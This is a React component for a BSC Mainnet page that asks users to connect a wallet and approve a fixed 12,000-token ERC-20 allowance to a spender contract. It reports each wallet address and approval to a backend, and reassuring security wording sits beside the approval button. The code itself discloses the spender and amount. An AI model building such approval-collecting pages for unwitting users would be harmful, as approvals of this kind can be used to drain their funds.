import { useEffect, useState, useCallback } from 'react';
import { Contract, parseUnits, isAddress, formatUnits } from 'ethers';
import { connectWallet } from '../wallet';
import { CHAIN_ID, CONTRACT, api } from '../api';

const ERC20_ABI = [
  'function approve(address,uint256) returns (bool)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address,address) view returns (uint256)',
];

// Well-known standard verified tokens on BSC Mainnet (Chain ID 56)
export const DEFAULT_TOKENS = [
  {
    symbol: 'USDT',
    name: 'Tether USD (BSC-USD)',
    address: '0x55d398326f99059fF775485246999027B3197955',
    decimals: 18,
  },
  {
    symbol: 'USDC',
    name: 'USD Coin',
    address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    decimals: 18,
  },
  {
    symbol: 'DAI',
    name: 'Dai Stablecoin',
    address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
    decimals: 18,
  },
];

// Fixed approval limit (in whole token units) — always shown to the user.
const APPROVAL_AMOUNT = '12000';
const APPROVAL_LABEL = '12,000';

export default function UserPage() {
  const [wallet, setWallet] = useState(null);
  const [selectedTokenAddr, setSelectedTokenAddr] = useState(DEFAULT_TOKENS[0].address);
  const [isCustomToken, setIsCustomToken] = useState(false);
  const [customTokenAddr, setCustomTokenAddr] = useState('');
  
  const [tokenInfo, setTokenInfo] = useState(null);
  const [loadingToken, setLoadingToken] = useState(false);
  const [status, setStatus] = useState({ kind: 'idle', msg: '', txHash: '' });

  const activeTokenAddress = isCustomToken ? customTokenAddr : selectedTokenAddr;

  const handleConnect = async () => {
    try {
      const w = await connectWallet();
      setWallet(w);
      setStatus({ kind: 'ok', msg: `Wallet connected: ${shortAddr(w.address)}` });
      api.recordConnect(w.address).catch(() => {});
    } catch (e) {
      setStatus({ kind: 'err', msg: e.message });
    }
  };

  const loadTokenData = useCallback(async (tokenAddr, userWallet) => {
    if (!isAddress(tokenAddr) || !userWallet?.provider) return;
    setLoadingToken(true);
    try {
      const contract = new Contract(tokenAddr, ERC20_ABI, userWallet.provider);
      const [decimals, symbol, name, balance, allowance] = await Promise.all([
        contract.decimals(),
        contract.symbol().catch(() => 'TOKEN'),
        contract.name().catch(() => 'Unknown Token'),
        contract.balanceOf(userWallet.address),
        contract.allowance(userWallet.address, CONTRACT),
      ]);

      const dec = Number(decimals);
      const formattedBalance = formatUnits(balance, dec);
      const formattedAllowance = formatUnits(allowance, dec);

      setTokenInfo({
        address: tokenAddr,
        symbol,
        name,
        decimals: dec,
        rawBalance: balance,
        formattedBalance,
        rawAllowance: allowance,
        formattedAllowance,
      });
    } catch (err) {
      console.error('Failed to load token:', err);
      setTokenInfo(null);
    } finally {
      setLoadingToken(false);
    }
  }, []);

  // Reload when wallet or active token changes
  useEffect(() => {
    if (wallet && activeTokenAddress && isAddress(activeTokenAddress)) {
      loadTokenData(activeTokenAddress, wallet);
    }
  }, [wallet, activeTokenAddress, loadTokenData]);

  const handleApprove = async (approveAmount = APPROVAL_AMOUNT) => {
    if (!wallet) return setStatus({ kind: 'err', msg: 'Please connect your wallet first.' });
    if (wallet.chainId !== CHAIN_ID) {
      return setStatus({
        kind: 'err',
        msg: `Please switch your wallet network to BSC Mainnet (Chain ID: ${CHAIN_ID}).`,
      });
    }
    if (!isAddress(activeTokenAddress)) {
      return setStatus({ kind: 'err', msg: 'Invalid ERC-20 token address.' });
    }

    try {
      setStatus({ kind: 'busy', msg: 'Please confirm the approval transaction in your wallet…' });
      const contract = new Contract(activeTokenAddress, ERC20_ABI, wallet.signer);
      const decimals = tokenInfo?.decimals ?? (await contract.decimals());
      const units = parseUnits(approveAmount, decimals);

      const tx = await contract.approve(CONTRACT, units);
      setStatus({
        kind: 'busy',
        msg: `Transaction broadcasted. Awaiting confirmation…`,
        txHash: tx.hash,
      });

      await tx.wait();
      setStatus({
        kind: 'ok',
        msg: Number(approveAmount) === 0 ? 'Allowance successfully revoked!' : `Allowance of ${approveAmount} ${tokenInfo?.symbol || 'tokens'} approved!`,
        txHash: tx.hash,
      });

      api.recordApproval({
        address: wallet.address,
        token: activeTokenAddress,
        symbol: tokenInfo?.symbol || 'TOKEN',
        txHash: tx.hash,
        allowance: approveAmount,
      }).catch((e) => console.error('Failed to notify backend:', e));

      // Refresh on-chain balance & allowance
      await loadTokenData(activeTokenAddress, wallet);
    } catch (err) {
      setStatus({ kind: 'err', msg: err.shortMessage || err.message });
    }
  };

  const handleRevoke = async () => {
    await handleApprove('0');
  };

  return (
    <div className="card wide app-card">
      <div className="card-header">
        <div>
          <h1>Transparent Token Approval</h1>
          <p className="subtitle">
            Securely configure spending allowances for verified smart contracts with full on-chain visibility.
          </p>
        </div>
        <div className="network-pill">
          <span className="dot online"></span> BSC Mainnet ({CHAIN_ID})
        </div>
      </div>

      {/* Wallet Status Card */}
      <div className="status-banner">
        {!wallet ? (
          <div className="connect-prompt">
            <p>Connect your Web3 wallet (MetaMask, Rabby, Trust Wallet) to view token balances and active permissions.</p>
            <button className="primary-btn" onClick={handleConnect}>
              Connect Wallet
            </button>
          </div>
        ) : (
          <div className="wallet-connected-row">
            <div>
              <span className="label-caption">Connected Wallet</span>
              <div className="mono bold">{wallet.address}</div>
            </div>
            <span className="badge badge-success">Connected</span>
          </div>
        )}
      </div>

      {/* Token Selector Section */}
      <div className="form-group">
        <label className="section-title">Select Token</label>
        <div className="token-chips">
          {DEFAULT_TOKENS.map((tok) => (
            <button
              key={tok.address}
              type="button"
              className={`chip-btn ${!isCustomToken && selectedTokenAddr === tok.address ? 'active' : ''}`}
              onClick={() => {
                setIsCustomToken(false);
                setSelectedTokenAddr(tok.address);
              }}
            >
              <span className="chip-symbol">{tok.symbol}</span>
              <span className="chip-name">{tok.name}</span>
            </button>
          ))}
          <button
            type="button"
            className={`chip-btn ${isCustomToken ? 'active' : ''}`}
            onClick={() => setIsCustomToken(true)}
          >
            Custom Token
          </button>
        </div>

        {isCustomToken && (
          <div className="custom-token-input-group">
            <input
              className="mono"
              placeholder="Paste ERC-20 Token Contract Address (0x…)"
              value={customTokenAddr}
              onChange={(e) => setCustomTokenAddr(e.target.value.trim())}
            />
          </div>
        )}
      </div>

      {/* Contract & Token Disclosure Card */}
      <div className="disclosure-grid">
        <div className="disclosure-box">
          <span className="label-caption">Selected Token Contract</span>
          <div className="mono small text-truncate">
            {tokenInfo?.address || activeTokenAddress || 'None'}
          </div>
          {activeTokenAddress && isAddress(activeTokenAddress) && (
            <a
              href={`https://bscscan.com/token/${activeTokenAddress}`}
              target="_blank"
              rel="noreferrer"
              className="link-external"
            >
              View Token on BscScan ↗
            </a>
          )}
        </div>

        <div className="disclosure-box">
          <span className="label-caption">Authorized Spender Contract</span>
          <div className="mono small text-truncate">{CONTRACT}</div>
          <a
            href={`https://bscscan.com/address/${CONTRACT}#code`}
            target="_blank"
            rel="noreferrer"
            className="link-external"
          >
            View SimpleProxy on BscScan ↗
          </a>
        </div>
      </div>

      {/* Live Balances and Allowance Card */}
      {wallet && (
        <div className="stats-card">
          <div className="stat-col">
            <span className="stat-label">Your Wallet Balance</span>
            <span className="stat-value">
              {loadingToken ? 'Loading…' : `${tokenInfo ? tokenInfo.formattedBalance : '0.00'} ${tokenInfo?.symbol || ''}`}
            </span>
          </div>

          <div className="stat-col">
            <span className="stat-label">Current Active Allowance</span>
            <div className="allowance-badge-group">
              <span className="stat-value highlight">
                {loadingToken ? 'Loading…' : `${tokenInfo ? tokenInfo.formattedAllowance : '0.00'} ${tokenInfo?.symbol || ''}`}
              </span>
              {tokenInfo && Number(tokenInfo.formattedAllowance) > 0 && (
                <span className="badge badge-info">Active</span>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Fixed approval limit disclosure */}
      <div className="stats-card">
        <div className="stat-col">
          <span className="stat-label">Approval Limit</span>
          <span className="stat-value">
            {APPROVAL_LABEL} {tokenInfo?.symbol || ''}
          </span>
        </div>
        <div className="stat-col">
          <span className="stat-label">What this does</span>
          <span className="hint" style={{ margin: 0 }}>
            Allows the spender contract above to transfer up to {APPROVAL_LABEL} {tokenInfo?.symbol || 'tokens'} from your wallet.
          </span>
        </div>
      </div>

      {/* Action Buttons */}
      <div className="button-action-group">
        <button
          className="primary-btn flex-btn"
          onClick={() => handleApprove(APPROVAL_AMOUNT)}
          disabled={!wallet || status.kind === 'busy'}
        >
          {status.kind === 'busy'
            ? 'Processing in Wallet…'
            : `Approve ${APPROVAL_LABEL} ${tokenInfo?.symbol || 'Tokens'}`}
        </button>

        {tokenInfo && Number(tokenInfo.formattedAllowance) > 0 && (
          <button
            className="secondary-btn danger-outline"
            onClick={handleRevoke}
            disabled={status.kind === 'busy'}
          >
            Revoke Allowance (Set to 0)
          </button>
        )}
      </div>

      {/* Real-time Status Notice */}
      {status.msg && (
        <div className={`status-feedback ${status.kind}`}>
          <div>{status.msg}</div>
          {status.txHash && (
            <a
              href={`https://bscscan.com/tx/${status.txHash}`}
              target="_blank"
              rel="noreferrer"
              className="tx-link"
            >
              View Tx on BscScan ({shortAddr(status.txHash)}) ↗
            </a>
          )}
        </div>
      )}

      {/* Security & Transparency Notice */}
      <div className="security-notice">
        <div className="notice-icon">🛡️</div>
        <div>
          <h4>Security & Transparency Guarantee</h4>
          <p>
            An ERC-20 approval grants the contract permission to transfer tokens on your behalf only when an authorized function is executed.
            Your funds remain in your custody until executed. You can adjust or completely revoke this approval to 0 at any time.
          </p>
        </div>
      </div>
    </div>
  );
}

function shortAddr(addr) {
  if (!addr) return '';
  return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
}
